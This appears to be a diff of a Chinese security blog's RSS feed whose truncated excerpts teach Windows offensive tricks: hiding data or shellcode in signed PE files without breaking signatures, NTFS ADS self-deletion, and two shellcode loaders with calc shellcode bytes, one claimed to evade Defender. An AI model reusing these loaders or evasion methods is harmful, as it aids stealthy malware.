@@ -1,85 +1,40 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>trick on 2867a0</title>
-    <link>https://2867a0.github.io/tags/trick/</link>
-    <description>Recent content in trick on 2867a0</description>
+    <title>Trick on 2867a0</title>
+    <link>http://localhost:1313/tags/trick/</link>
+    <description>Recent content in Trick on 2867a0</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
-    <lastBuildDate>Sat, 22 Jul 2023 23:09:00 +0800</lastBuildDate><atom:link href="https://2867a0.github.io/tags/trick/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sat, 22 Jul 2023 23:09:00 +0800</lastBuildDate>
+    <atom:link href="http://localhost:1313/tags/trick/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>不破坏签名并修改签名文件</title>
-      <link>https://2867a0.github.io/posts/2023/modify_signature_hash/</link>
+      <link>http://localhost:1313/posts/2023/modify_signature_hash/</link>
       <pubDate>Sat, 22 Jul 2023 23:09:00 +0800</pubDate>
-      
-      <guid>https://2867a0.github.io/posts/2023/modify_signature_hash/</guid>
-      <description>PE文件中，生成签名的时候会有一部分不参与签名hash计算，我们可以修改这部分而不破坏签名校验
-下图中粗体的部分，就是签名的相关内容。灰色背景的部分，不参与签名的hash计算。
-证书表偏移位于数据目录中第5个结构，VirtualAddress是文件偏移，Size是证书表的大小
-按照偏移找到证书表开头，证书表前几个字节是一个WIN_CERTIFICATE结构体，其中前4个字节为证书的大小。每一个证书信息都需要按照8字节进行对齐
-下图中，最后两个字节是填充字节00，手动修改这一部分进行验证。
-签名正常
-追加字节，需要修改DataDirArray[4].Size、证书大小
-26744-&amp;gt;26752
-0x6878 -&amp;gt; 0x6880
-修改完成，签名正常
-代码实现 C++版本的SigFlip可以自动添加shellcode到签名文件中。
-也有golang版本的，在此基础上进行了修改，只有修改签名驱动的hash功能
-修改的工具会在驱动的末尾添加 kfcvme50 的字符串</description>
+      <guid>http://localhost:1313/posts/2023/modify_signature_hash/</guid>
+      <description>PE文件中，生成签名的时候会有一部分不参与签名hash计算，我们可以修改这部分而不破坏签名校验&#xA;下图中粗体的部分，就是签名的相关内容。灰色背景的部分，不参与签名的hash计算。&#xA;证书表偏移位于数据目录中第5个结构，VirtualAddress是文件偏移，Size是证书表的大小&#xA;按照偏移找到证书表开头，证书表前几个字节是一个WIN_CERTIFICATE结构体，其中前4个字节为证书的大小。每一个证书信息都需要按照8字节进行对齐&#xA;下图中，最后两个字节是填充字节00，手动修改这一部分进行验证。&#xA;签名正常&#xA;追加字节，需要修改DataDirArray[4].Size、证书大小&#xA;26744-&amp;gt;26752&#xA;0x6878 -&amp;gt; 0x6880&#xA;修改完成，签名正常&#xA;代码实现 C++版本的SigFlip可以自动添加shellcode到签名文件中。&#xA;也有golang版本的，在此基础上进行了修改，只有修改签名驱动的hash功能&#xA;修改的工具会在驱动的末尾添加 kfcvme50 的字符串</description>
     </item>
-    
     <item>
       <title>利用ADS删除自身</title>
-      <link>https://2867a0.github.io/posts/2023/adsdeleteself/</link>
+      <link>http://localhost:1313/posts/2023/adsdeleteself/</link>
       <pubDate>Sun, 11 Jun 2023 08:18:00 +0800</pubDate>
-      
-      <guid>https://2867a0.github.io/posts/2023/adsdeleteself/</guid>
-      <description>ADS Microsoft于90年代初期引入了一种称为“数据流”的概念，从而使NTFS可以作为Macintosh客户端访问文件服务器的文件系统。因为Mac OS 是利用Mac的分层式文件系统（HFS)上所谓的资源分支数据流，用于存放图标等应用程序的元数据。NTFS和FAT的差别就是FAT由一个数据流构成，而NTFS可以在一个文件内存里面存储多个数据流。
-在windows协议MS-FSA中ADS的定义：一个被命名的数据流是一个文件或者目录的一部分，它们可以独立于默认数据流被单独的打开。许多数据流的操作之影响数据流并不影响其他数据流，文件和目录
-所有的文件在NTFS中至少包含一个主数据流，也就是用户可见的文件或是目录，一个文件在NTFS中真正的文件名称格式：
-&amp;lt;文件名&amp;gt;:&amp;lt;流名&amp;gt;:&amp;lt;流种类&amp;gt; 文件ADS默认没有流名字，一个文件test.txt在NTFS中的全名为test.txt::$DATA
-文件夹没有默认的数据流（也就是没有主数据流），但是有一个默认的目录流为$INDEX_ALLOCATION，默认的流名为$I30。比如文件夹testDir全名为testDir:$I30:$INDEX_ALLOCATION
-假设查看文件1.txt的数据流内容，可以输入如下命令，其内容和1.txt是一样的，在数据流中添加的内容保存后会被写入对应的文件中。如下图，原来1.txt中只有内容1.txt，在数据流中写入2，保存后重新打开原文件，发现2被写入
-notepad.exe 1.txt::$DATA 简单提一下，用微软的streams.exe工具可以遍历出程序的备用数据流
-自删除 自删除原理是，将文件重命名为数据流格式，然后删除该数据流。利用这种方法去删除可以无视当前文件句柄占用，如果程序处于运行中也不会破坏程序的运行。
-代码如下，首先以DELETE方式获取自身文件句柄，调用SetFileInformationByHandle()将文件名修改为:anyany，以调试编译运行的时候SetFileInformationByHandle()函数会报错，忽略就行。
-修改完成后重新打开一次文件句柄，再次调用SetFileInformationByHandle()删除文件
-程序执行，自删除文件，后续的代码依旧可以运行
-上面的代码中我设置了两个暂停，第一个pause中，如果以代码调试的方式打开程序，CreateFileW函数会获取不到文件句柄，解决方法也简单，x64gbd附加到进程就可以调试了。
-第二个pause是在将文件修改为数据流之后，用winhex创建磁盘快照可以发现，原来的程序变成了0B，进入程序之后any文件其实就是原来的程序
-从上面可以看出，我们在第一次rename的时候是将程序移动到了数据流中（磁盘中会有一个0B的文件），第二次删除的时候删除的0B文件是我们的数据流文件。
-这里还有一个点，在第一次rename文件之后如果不关闭程序的句柄（也就是一直暂停到第二个pause），火绒剑操作这个文件的时候会卡死
-完整代码 CloseSelf.h
-#pragma once #pragma comment(lib, &amp;#34;Shlwapi.lib&amp;#34;) #include &amp;lt;Windows.h&amp;gt; #include &amp;lt;shlwapi.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #define DS_STREAM_RENAME L&amp;#34;:anyany:$DATA&amp;#34; #define DS_DEBUG_LOG(msg) wprintf(L&amp;#34;[LOG] - %s\n&amp;#34;, msg) BOOL ds_deposite_handle(HANDLE hHandle); BOOL ds_rename_handle(HANDLE hHandle); HANDLE ds_open_handle(PWCHAR pwPath); CloseSelf.cpp
-#include &amp;#34;CloseSelf.h&amp;#34; HANDLE ds_open_handle(PWCHAR pwPath) { return CreateFileW(pwPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); } BOOL ds_rename_handle(HANDLE hHandle) { FILE_RENAME_INFO fRename; RtlSecureZeroMemory(&amp;amp;fRename, sizeof(fRename)); // set our FileNameLength and FileName to DS_STREAM_RENAME LPWSTR lpwStream = (LPWSTR)DS_STREAM_RENAME; fRename.</description>
+      <guid>http://localhost:1313/posts/2023/adsdeleteself/</guid>
+      <description>ADS Microsoft于90年代初期引入了一种称为“数据流”的概念，从而使NTFS可以作为Macintosh客户端访问文件服务器的文件系统。因为Mac OS 是利用Mac的分层式文件系统（HFS)上所谓的资源分支数据流，用于存放图标等应用程序的元数据。NTFS和FAT的差别就是FAT由一个数据流构成，而NTFS可以在一个文件内存里面存储多个数据流。&#xA;在windows协议MS-FSA中ADS的定义：一个被命名的数据流是一个文件或者目录的一部分，它们可以独立于默认数据流被单独的打开。许多数据流的操作之影响数据流并不影响其他数据流，文件和目录&#xA;所有的文件在NTFS中至少包含一个主数据流，也就是用户可见的文件或是目录，一个文件在NTFS中真正的文件名称格式：&#xA;&amp;lt;文件名&amp;gt;:&amp;lt;流名&amp;gt;:&amp;lt;流种类&amp;gt; 文件ADS默认没有流名字，一个文件test.txt在NTFS中的全名为test.txt::$DATA&#xA;文件夹没有默认的数据流（也就是没有主数据流），但是有一个默认的目录流为$INDEX_ALLOCATION，默认的流名为$I30。比如文件夹testDir全名为testDir:$I30:$INDEX_ALLOCATION&#xA;假设查看文件1.txt的数据流内容，可以输入如下命令，其内容和1.txt是一样的，在数据流中添加的内容保存后会被写入对应的文件中。如下图，原来1.txt中只有内容1.txt，在数据流中写入2，保存后重新打开原文件，发现2被写入&#xA;notepad.exe 1.txt::$DATA 简单提一下，用微软的streams.exe工具可以遍历出程序的备用数据流&#xA;自删除 自删除原理是，将文件重命名为数据流格式，然后删除该数据流。利用这种方法去删除可以无视当前文件句柄占用，如果程序处于运行中也不会破坏程序的运行。&#xA;代码如下，首先以DELETE方式获取自身文件句柄，调用SetFileInformationByHandle()将文件名修改为:anyany，以调试编译运行的时候SetFileInformationByHandle()函数会报错，忽略就行。&#xA;修改完成后重新打开一次文件句柄，再次调用SetFileInformationByHandle()删除文件&#xA;程序执行，自删除文件，后续的代码依旧可以运行&#xA;上面的代码中我设置了两个暂停，第一个pause中，如果以代码调试的方式打开程序，CreateFileW函数会获取不到文件句柄，解决方法也简单，x64gbd附加到进程就可以调试了。&#xA;第二个pause是在将文件修改为数据流之后，用winhex创建磁盘快照可以发现，原来的程序变成了0B，进入程序之后any文件其实就是原来的程序&#xA;从上面可以看出，我们在第一次rename的时候是将程序移动到了数据流中（磁盘中会有一个0B的文件），第二次删除的时候删除的0B文件是我们的数据流文件。&#xA;这里还有一个点，在第一次rename文件之后如果不关闭程序的句柄（也就是一直暂停到第二个pause），火绒剑操作这个文件的时候会卡死&#xA;完整代码 CloseSelf.h&#xA;#pragma once #pragma comment(lib, &amp;#34;Shlwapi.lib&amp;#34;) #include &amp;lt;Windows.h&amp;gt; #include &amp;lt;shlwapi.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #define DS_STREAM_RENAME L&amp;#34;:anyany:$DATA&amp;#34; #define DS_DEBUG_LOG(msg) wprintf(L&amp;#34;[LOG] - %s\n&amp;#34;, msg) BOOL ds_deposite_handle(HANDLE hHandle); BOOL ds_rename_handle(HANDLE hHandle); HANDLE ds_open_handle(PWCHAR pwPath); CloseSelf.cpp&#xA;#include &amp;#34;CloseSelf.h&amp;#34; HANDLE ds_open_handle(PWCHAR pwPath) { return CreateFileW(pwPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); } BOOL ds_rename_handle(HANDLE hHandle) { FILE_RENAME_INFO fRename; RtlSecureZeroMemory(&amp;amp;fRename, sizeof(fRename)); // set our FileNameLength and FileName to DS_STREAM_RENAME LPWSTR lpwStream = (LPWSTR)DS_STREAM_RENAME; fRename.</description>
     </item>
-    
     <item>
       <title>Write Memory Trick</title>
-      <link>https://2867a0.github.io/posts/2023/writememorytrick/</link>
+      <link>http://localhost:1313/posts/2023/writememorytrick/</link>
       <pubDate>Wed, 22 Mar 2023 07:12:30 +0800</pubDate>
-      
-      <guid>https://2867a0.github.io/posts/2023/writememorytrick/</guid>
-      <description>[TOC]
-vx-underground档案中记载的技巧，用一些非常见的函数写入shellcode到内存。原文来自xss.is论坛，这里只记录复现出来的函数。
-PathCanonicalizeA 源代码如下，首先HeapCreate()、HeapAlloc()分配dst_shellcode内存空间，使用PathCanonicalizeA()函数将源shellcode逐字节复制到dst_shellcode，修改dst_shellcode内存空间权限为RWX，最后调用**InitOnceExecuteOnce()**执行。
-PathCanonicalizeA函数在使用的时候有两个问题，一是遇到0x00字符时终止，二是长度不能过长。所以需要确保源shellcode不能有坏字符，同时shellcode长度不能过长。代码里面是将源shellcode先写到数组，再将数组内容复制到dst_shellcode内存空间。
-#include &amp;lt;Windows.h&amp;gt; #include &amp;lt;Shlwapi.h&amp;gt; #pragma comment(lib, &amp;#34;Shlwapi.lib&amp;#34;) bool test1() { // x64 calc.exe shellcode // https://www.exploit-db.com/shellcodes/49819 unsigned char orig_shellcode[] = &amp;#34;\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b&amp;#34; &amp;#34;\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2&amp;#34; &amp;#34;\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b&amp;#34; &amp;#34;\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04&amp;#34; &amp;#34;\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0&amp;#34; &amp;#34;\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2&amp;#34; &amp;#34;\x48\x83\xec\x20\x41\xff\xd6&amp;#34;; size_t ori_shellcode_size = sizeof orig_shellcode; LPVOID copied_shellcode = NULL; HANDLE heap = NULL; BOOL ret = 0; int size = 0; heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0); copied_shellcode = HeapAlloc(heap, 0, ori_shellcode_size); ZeroMemory(copied_shellcode, ori_shellcode_size); // copy shellcode for (size_t i = 0; i &amp;lt; ori_shellcode_size; i++) { char temp[2] = { 0 }; temp[0] = orig_shellcode[i]; if (!</description>
+      <guid>http://localhost:1313/posts/2023/writememorytrick/</guid>
+      <description>[TOC]&#xA;vx-underground档案中记载的技巧，用一些非常见的函数写入shellcode到内存。原文来自xss.is论坛，这里只记录复现出来的函数。&#xA;PathCanonicalizeA 源代码如下，首先HeapCreate()、HeapAlloc()分配dst_shellcode内存空间，使用PathCanonicalizeA()函数将源shellcode逐字节复制到dst_shellcode，修改dst_shellcode内存空间权限为RWX，最后调用**InitOnceExecuteOnce()**执行。&#xA;PathCanonicalizeA函数在使用的时候有两个问题，一是遇到0x00字符时终止，二是长度不能过长。所以需要确保源shellcode不能有坏字符，同时shellcode长度不能过长。代码里面是将源shellcode先写到数组，再将数组内容复制到dst_shellcode内存空间。&#xA;#include &amp;lt;Windows.h&amp;gt; #include &amp;lt;Shlwapi.h&amp;gt; #pragma comment(lib, &amp;#34;Shlwapi.lib&amp;#34;) bool test1() { // x64 calc.exe shellcode // https://www.exploit-db.com/shellcodes/49819 unsigned char orig_shellcode[] = &amp;#34;\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b&amp;#34; &amp;#34;\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2&amp;#34; &amp;#34;\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b&amp;#34; &amp;#34;\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04&amp;#34; &amp;#34;\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0&amp;#34; &amp;#34;\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2&amp;#34; &amp;#34;\x48\x83\xec\x20\x41\xff\xd6&amp;#34;; size_t ori_shellcode_size = sizeof orig_shellcode; LPVOID copied_shellcode = NULL; HANDLE heap = NULL; BOOL ret = 0; int size = 0; heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0); copied_shellcode = HeapAlloc(heap, 0, ori_shellcode_size); ZeroMemory(copied_shellcode, ori_shellcode_size); // copy shellcode for (size_t i = 0; i &amp;lt; ori_shellcode_size; i++) { char temp[2] = { 0 }; temp[0] = orig_shellcode[i]; if (!</description>
     </item>
-    
     <item>
       <title>Big Stack bypass</title>
-      <link>https://2867a0.github.io/posts/2023/bigstack/</link>
+      <link>http://localhost:1313/posts/2023/bigstack/</link>
       <pubDate>Mon, 13 Feb 2023 08:00:00 +0800</pubDate>
-      
-      <guid>https://2867a0.github.io/posts/2023/bigstack/</guid>
-      <description>[TOC]
-2022年底国外技术人员发现的技巧，在内存中分配一个大的堆栈，defender就检测不了了。
-测试用的是x64 metasploit 生成的 calc，原文中是硬编码栈内容，生成非常大。下面的代码时创建一个动态数组，将shellcode放到数组末尾，武器化可以远程拉取shellcode。
-visual studio编译需要设置字符集为多字节、堆栈提交大小为200000，堆栈大小可以自己定义
-修改后的完整代码：
-#include &amp;lt;windows.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;time.h&amp;gt; #include &amp;lt;random&amp;gt; typedef LPVOID (WINAPI* VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect); typedef BOOL (WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD); typedef HANDLE (WINAPI* CreateThread_t)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); unsigned char sVirtualProtect[] = { &amp;#39;V&amp;#39;,&amp;#39;i&amp;#39;,&amp;#39;r&amp;#39;,&amp;#39;t&amp;#39;,&amp;#39;u&amp;#39;,&amp;#39;a&amp;#39;,&amp;#39;l&amp;#39;,&amp;#39;P&amp;#39;,&amp;#39;r&amp;#39;,&amp;#39;o&amp;#39;,&amp;#39;t&amp;#39;,&amp;#39;e&amp;#39;,&amp;#39;c&amp;#39;,&amp;#39;t&amp;#39;, 0x0 }; unsigned char sVirtualAlloc[] = { &amp;#39;V&amp;#39;,&amp;#39;i&amp;#39;,&amp;#39;r&amp;#39;,&amp;#39;t&amp;#39;,&amp;#39;u&amp;#39;,&amp;#39;a&amp;#39;,&amp;#39;l&amp;#39;,&amp;#39;A&amp;#39;,&amp;#39;l&amp;#39;,&amp;#39;l&amp;#39;,&amp;#39;o&amp;#39;,&amp;#39;c&amp;#39;,0x0 }; unsigned char sCreateThread[] = { &amp;#39;C&amp;#39;,&amp;#39;r&amp;#39;,&amp;#39;e&amp;#39;,&amp;#39;a&amp;#39;,&amp;#39;t&amp;#39;,&amp;#39;e&amp;#39;,&amp;#39;T&amp;#39;,&amp;#39;h&amp;#39;,&amp;#39;r&amp;#39;,&amp;#39;e&amp;#39;,&amp;#39;a&amp;#39;,&amp;#39;d&amp;#39;,0x0, }; #define STACKSIZE 2000000 int main (VOID) { //msfvenom calc payload // msfvenom --platform windows --arch x64 -p windows/x64/exec CMD=calc.</description>
+      <guid>http://localhost:1313/posts/2023/bigstack/</guid>
+      <description>[TOC]&#xA;2022年底国外技术人员发现的技巧，在内存中分配一个大的堆栈，defender就检测不了了。&#xA;测试用的是x64 metasploit 生成的 calc，原文中是硬编码栈内容，生成非常大。下面的代码时创建一个动态数组，将shellcode放到数组末尾，武器化可以远程拉取shellcode。&#xA;visual studio编译需要设置字符集为多字节、堆栈提交大小为200000，堆栈大小可以自己定义&#xA;修改后的完整代码：&#xA;#include &amp;lt;windows.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;time.h&amp;gt; #include &amp;lt;random&amp;gt; typedef LPVOID (WINAPI* VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect); typedef BOOL (WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD); typedef HANDLE (WINAPI* CreateThread_t)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); unsigned char sVirtualProtect[] = { &amp;#39;V&amp;#39;,&amp;#39;i&amp;#39;,&amp;#39;r&amp;#39;,&amp;#39;t&amp;#39;,&amp;#39;u&amp;#39;,&amp;#39;a&amp;#39;,&amp;#39;l&amp;#39;,&amp;#39;P&amp;#39;,&amp;#39;r&amp;#39;,&amp;#39;o&amp;#39;,&amp;#39;t&amp;#39;,&amp;#39;e&amp;#39;,&amp;#39;c&amp;#39;,&amp;#39;t&amp;#39;, 0x0 }; unsigned char sVirtualAlloc[] = { &amp;#39;V&amp;#39;,&amp;#39;i&amp;#39;,&amp;#39;r&amp;#39;,&amp;#39;t&amp;#39;,&amp;#39;u&amp;#39;,&amp;#39;a&amp;#39;,&amp;#39;l&amp;#39;,&amp;#39;A&amp;#39;,&amp;#39;l&amp;#39;,&amp;#39;l&amp;#39;,&amp;#39;o&amp;#39;,&amp;#39;c&amp;#39;,0x0 }; unsigned char sCreateThread[] = { &amp;#39;C&amp;#39;,&amp;#39;r&amp;#39;,&amp;#39;e&amp;#39;,&amp;#39;a&amp;#39;,&amp;#39;t&amp;#39;,&amp;#39;e&amp;#39;,&amp;#39;T&amp;#39;,&amp;#39;h&amp;#39;,&amp;#39;r&amp;#39;,&amp;#39;e&amp;#39;,&amp;#39;a&amp;#39;,&amp;#39;d&amp;#39;,0x0, }; #define STACKSIZE 2000000 int main (VOID) { //msfvenom calc payload // msfvenom --platform windows --arch x64 -p windows/x64/exec CMD=calc.</description>
     </item>
-    
   </channel>
 </rss>
